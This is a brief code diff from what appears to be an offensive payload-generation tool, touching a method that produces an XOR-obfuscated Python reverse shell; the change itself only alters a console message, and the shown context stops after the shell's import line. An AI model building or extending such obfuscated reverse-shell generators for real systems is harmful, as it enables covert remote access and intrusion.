@@ -14,7 +14,7 @@ class ShtiwePayload:
         return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
 
     def generate_python_revshell(self, output_file="shell.py"):
-        console.print(f"[bold red][☠][/bold red] Generating XOR-obfuscated Python Reverse Shell...")
+        console.print(f"[bold red][][/bold red] Generating XOR-obfuscated Python Reverse Shell...")
         
         raw_code = f"""
 import socket,subprocess,os
